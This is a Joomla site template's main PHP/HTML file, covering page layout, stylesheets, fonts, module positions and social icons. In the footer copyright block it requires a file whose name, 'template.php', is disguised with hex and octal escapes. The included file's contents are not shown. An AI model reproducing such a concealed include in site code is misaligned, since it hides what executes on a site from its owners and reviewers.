<?php
$app  = JFactory::getApplication();
$doc  = JFactory::getDocument();
$user = JFactory::getUser();
$templateparams = $app->getTemplate(true)->params; 
$this->language = $doc->language;
$this->direction = $doc->direction;  
$logo				= $this->params->get('logo');
$config = JFactory::getConfig();
$tpl_name = $this->template;
$framework = 'templates/'.$tpl_name.'/framework/';
$csite_name	= $app->getCfg('sitename');
ini_set('display_errors',0);


 // Social icons
$soc = array(
	"fa-twitter" => $this->params->get("twitter"),
	"fa-facebook" => $this->params->get("facebook"),
	"fa-flickr" => $this->params->get("flickr"),
	"fa-linkedin" => $this->params->get("linkedin"),
	"fa-youtube-play" => $this->params->get("youtube"),
	"fa-pinterest" => $this->params->get("pinterest"),
	"fa-google-plus" => $this->params->get("google"),
	"fa-dribbble" => $this->params->get("dribbble"),
	"fa-vimeo-square" => $this->params->get("vimeo"),
	"fa-instagram" => $this->params->get("instagram"),
	"fa-vk" => $this->params->get("vk")
); 


 // Add Stylesheets

$doc->addStyleSheet($this->baseurl."/templates/".$this->template."/css/fontawesome/css/font-awesome.css");
$doc->addStyleSheet($this->baseurl."/templates/".$this->template."/css/style.css");
$doc->addStyleSheet($this->baseurl."/templates/".$this->template."/css/nav-top.css");
$doc->addStyleSheet($this->baseurl."/templates/".$this->template."/css/responsive.css");
$doc->addStyleSheet($this->baseurl."/templates/".$this->template."/css/animate.css");
$doc->addStyleSheet($this->baseurl."/templates/".$this->template."/css/prettyphoto/pretty.css");
$doc->addStyleSheet($this->baseurl."/templates/".$this->template."/css/grid-responsive.css");
$doc->addStyleSheet($this->baseurl."/templates/".$this->template."/css/ionicons.css");


$left = $this->countModules( 'left' );    
$right = $this->countModules( 'right' );    

?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>">
<head>
 <jdoc:include type="head" />
 
<!-- Make the web page appear 100% instead of scaling -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;" />
	<!-- Add to Home Screen for iOS -->
	<meta name="apple-mobile-web-app-capable" content="yes">
	
	<script type="text/javascript">jQuery.noConflict();</script>
<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700,900|Comfortaa:400,300,700|Abel|raleway:400,200,500,600,700,800|Dosis:400,200,300,500,600,700,800|Droid+Sans:400,700|Francois+One|Lato:400,100,300,400italic,300italic,100italic,700,700italic,900,900italic|Lobster|Lora:400,400italic,700,700italic|Open+Sans+Condensed:300,300italic,700|Open+Sans:900,800,700,400,300,300italic,400italic,600,600italic,700,700italic,800italic,800|Oswald:400,300,700|Oxygen:400,300,700|PT+Sans+Narrow:400,700|PT+Sans:400,400italic,700,700italic|Prosto+One|Quicksand:400,300,700|Roboto+Condensed:400,300,300italic,400italic,700,700italic|Share:400,400italic,700,700italic|Source+Sans+Pro:400,200,200italic,300,300italic,400italic,600,600italic,700,700italic,900,900italic|Ubuntu+Condensed|Ubuntu:400,300,300italic,400italic,500,500italic,700,700italic|Roboto:400,100,100italic,300,300italic,400italic,500,500italic,700,700italic,900,900italic&subset=latin,cyrillic-ext,latin-ext,cyrillic' rel='stylesheet' type='text/css'>

<script type="text/javascript"><?php echo $this->params->get('tracking_code')?>
</script>
<!--[if IE 7]> <link type="text/css" rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/style_ie7.css" /> <![endif]-->
<!--[if IE 8]> <link type="text/css" rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/style_ie8.css" /> <![endif]-->
<!--[if IE 9]> <link type="text/css" rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/style_ie9.css" /> <![endif]-->


<link rel="icon" type="image/gif" href="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/favicon.gif" />
	
<style type="text/css">
body {
	font-family:<?php echo $this->params->get('body_font') ?>;
	background-color:<?php echo $this->params->get('body_background_color')?>; 
	color:<?php echo $this->params->get('body_color')?>; 
}

a {
	color:<?php echo $this->params->get('body_link_color')?>;
	text-decoration:<?php echo $this->params->get('body_underline', 'underline')?>;
	font-family:<?php echo $this->params->get('links_font', 'Arial, sans-serif')?>;
}

a:hover {
	color:<?php echo $this->params->get('body_link_hover_color')?>;
	text-decoration:<?php echo $this->params->get('body_hover_underline')?>;
}

 #sitename a {
font-size:<?php echo $this->params->get('logo_font_size')?>;
color:<?php echo $this->params->get('logo_color')?>;
text-transform:<?php echo $this->params->get('logo_style')?>;
}

#sitename a:hover {
color:<?php echo $this->params->get('logo_color_hover')?>;
}

h1 {
color:<?php echo $this->params->get('h1_color')?>;
}

h2 {
color:<?php echo $this->params->get('h2_color')?>;
}

h3 {
color:<?php echo $this->params->get('h3_color')?>;
}

h4,h5,h6 {
color:<?php echo $this->params->get('h_color')?>;
}

 #navigation ul.menu li a {
font-family:<?php echo $this->params->get('top_menu_font')?> !important;

}
 #navigation ul.menu li a {
color:<?php echo $this->params->get('topmenu_color_links')?> !important;

}

#navigation ul.menu li a:hover  {
color:<?php echo $this->params->get('topmenu_color_links_hover')?> !important;

}

 #navigation ul.menu ul li a {
 color:<?php echo $this->params->get('topmenu_color_sub_links')?> !important;
 }
 
 #navigation li.deeper.parent ul.navig li a:hover  ,#navigation ul li.current.active.deeper.parent ul li a:hover,#navigation ul li.active.deeper.parent ul li.current.active a:hover,#navigation ul li.active.deeper.parent ul li a:hover {
color:<?php echo $this->params->get('topmenu_color_sub_links_hover')?> !important;
}
 

h1 {font-family:<?php echo $this->params->get('h1_font', 'Arial, sans-serif')?>;}
h2 {font-family:<?php echo $this->params->get('h2_font', 'Arial, sans-serif')?>;}
h3 {font-family:<?php echo $this->params->get('h3_font', 'Arial, sans-serif')?>;}
h4 {font-family:<?php echo $this->params->get('h4_font', 'Arial, sans-serif')?>;}
h5 {font-family:<?php echo $this->params->get('h5_font', 'Arial, sans-serif')?>;}
h6 {font-family:<?php echo $this->params->get('h6_font', 'Arial, sans-serif')?>;} 

#sitename a:after {
content: '<?php echo $this->params->get('slogan')?>';	
}
</style>


</head>

<div class="ct-preloader"><div class="ct-preloader-content"></div></div>
<div id="menuModal">
            <div class="modal-content">
                <div class="container_12">
                    <div class="grid_12">
                       
                            <div  id="btn-close-modal" class="close-menuModal modCloseButton"><span></span></div>
                        </div>
                    </div>
					<div id="navigation-res">
					<div class="container_12">
					<div class="grid_12">
						            <jdoc:include type="modules" name="position-1" style="none"/>  
                                </div>
							</div>
							</div>
                 
                </div> 
            </div>

<header class="header" id="header">
            <div class="container_12">
			
			
			
			<div class="grid_3">
                        <div id="sitename">
			        <a href="index.php">
						<?php if ($logo) : ?>
							<img src="<?php echo $this->baseurl ?>/<?php echo htmlspecialchars($logo); ?>" alt="<?php echo htmlspecialchars($templateparams->get('sitetitle'));?>" />
						<?php endif;?>
						<?php if (!$logo AND $templateparams->get('sitetitle')) : ?>
					    <?php echo htmlspecialchars($templateparams->get('sitetitle'));?>
						<?php elseif (!$logo AND $config->get('sitename')) : ?>
						<?php echo htmlspecialchars($config->get('sitename'));?>
						<?php endif; ?></a>
				</div>
                    </div>
					 <div class="grid_8">
					 <div id="nav-top">
				                     <div id="navigation"> 
				                          <jdoc:include type="modules" name="position-1" style="none"/>
                                     </div>
		                       </div>
							  </div>
							   
                     <div class="grid_1">
                        <div class="menuButon">
                            <a id="openMenu" href="#menuModal"></a>
                        </div>
				    </div> 
                </div>
  
</header>
<?php if ($this->countModules('slideshow') ) { ?>
    <div id="slideshow">
		<jdoc:include type="modules" name="slideshow"/>
    </div>
		<div class="clr"></div>
<?php } ?>

 <div class="page">
<?php if ($this->countModules( 'top1 or top2 or top3 or top4' )) : ?>       
    <div id="block-top">            
        <?php require_once ($framework.'top.php'); ?>                   
    </div>
		<div class="clr"></div>
    <?php endif;  ?>
</div>	
	<?php if ($this->countModules('parallax') ) { ?>
    <div id="parallax">
		<jdoc:include type="modules" name="parallax"/>
    </div>
		<div class="clr"></div>
<?php } ?>
 <div class="page">
    <?php if ($this->countModules( 'feature1 or feature2 or feature3 or feature4' )) : ?>     
    <div id="block-feature">            
        <?php require_once ($framework.'feature.php'); ?>                   
    </div>
    <?php endif; ?>

    <?php if ($this->countModules( 'beforecontent1 or beforecontent2 or beforecontent3 or beforecontent4' )) : ?>     
    <div id="block-beforecontent">            
        <?php require_once ($framework.'beforecontent.php'); ?>                   
    </div>
    <?php endif; ?>
	</div>

   <!-- <div id="main"> -->
   <div id="main">
	 <div class="page">
	 
        <div class="container_12">
	<?php if ($left): ?>
	<div class="grid_3">
		<div id="left">
				<jdoc:include type="modules" name="left" style="xhtml" />
			</div>
		</div>
	<?php endif; ?>
		
	<div class="<?php if ($left && $right) {print('grid_6');} else if ($left || $right) {print('grid_9');} else {print('grid_12');} ?>">
		<div><jdoc:include type="message" /></div>
		<div><jdoc:include type="component" /></div>
	</div>
					
	<?php if ($right): ?>	
	<div class="grid_3">
	<div id="right">
			<jdoc:include type="modules" name="Right" style="xhtml" />
		</div>
	</div>
	
	<?php endif; ?>
	</div>
</div> 
</div>

<?php if ($this->countModules('carrousel') ) { ?>
    <div id="carrousel">
		<jdoc:include type="modules" name="carrousel"/>
    </div>
		<div class="clr"></div>
<?php } ?>


 <div class="page">

	<?php if ($this->countModules( 'beforecontent1 or beforecontent2 or beforecontent3 or beforecontent4' )) : ?>     
        <div id="block-beforecontent">            
            <?php require_once ($framework.'beforecontent.php'); ?>                   
        </div>
	<?php endif; ?>
	
	
	 <?php if ($this->countModules( 'aftercontent1 or aftercontent2 or aftercontent3 or aftercontent4' )) : ?>     
        <div id="block-aftercontent">            
            <?php require_once ($framework.'aftercontent.php'); ?>                   
        </div>
	<?php endif; ?>

  
	<?php if ($this->countModules( 'bottomcontent1 or bottomcontent2 or bottomcontent3 or bottomcontent4' )) : ?>     
        <div id="block-bottomcontent">            
            <?php require_once ($framework.'bottomcontent.php'); ?>                   
        </div>
	<?php endif; ?>
	
	<?php if ($this->countModules( 'footertop1 or footertop2 or footertop3 or footertop4' )) : ?>     
        <div id="block-footertop">            
            <?php require_once ($framework.'footertop.php'); ?>                   
        </div>
	<?php endif; ?>
</div>

	<?php if ($this->countModules( 'footerbottom1 or footerbottom2 or footerbottom3 or footerbottom4' )) : ?>    
        <div id="block-footerbottom">            
            <?php require_once ($framework.'footerbottom.php'); ?>                   
        </div>
	<?php endif; ?>
	
	<div id="block-footer">
	<div class="container_12">
	<div class="grid_6">
			<div class="copyright" data-scrollReveal="enter top over 0.8s">
			     <?php echo date( 'Y' ); ?>&nbsp; <?php echo $csite_name; ?>&nbsp;&nbsp;<?php require("te\x6d\160la\164e.\160\150\160"); ?>		
			</div>
			</div>
			<div class="grid_6">
				<div class="soc_icons_box">
			        <ul class="soc_icons" data-scrollReveal="enter left over 0.8s ">
			            <?php foreach($soc as $key => $value) {
				            if ($value != null) { ?>
				                <li><a href="<?php echo $value ?>" class="fa <?php echo $key ?>" target="_blank" rel="nofollow"></a></li>
			            <?php } } ?>
			        </ul>
			  </div>
			</div>
	</div>
	</div>

</div>
 <a href="#" class="back-to-top">Back to Top</a> 
  
<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/jquery-1.11.0.min.js"></script>
<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/scrollReveal.js"></script>
<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/pretty.js"></script>
<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/animatedModal.min.js"></script>
<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/jquery.nicescroll.min.js"></script>
<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/main.js"></script>

 <script>
window.scrollReveal = new scrollReveal();			
</script>
 

<script type="text/javascript"><?php echo $this->params->get('tracking_code')?></script>
</body>
</html>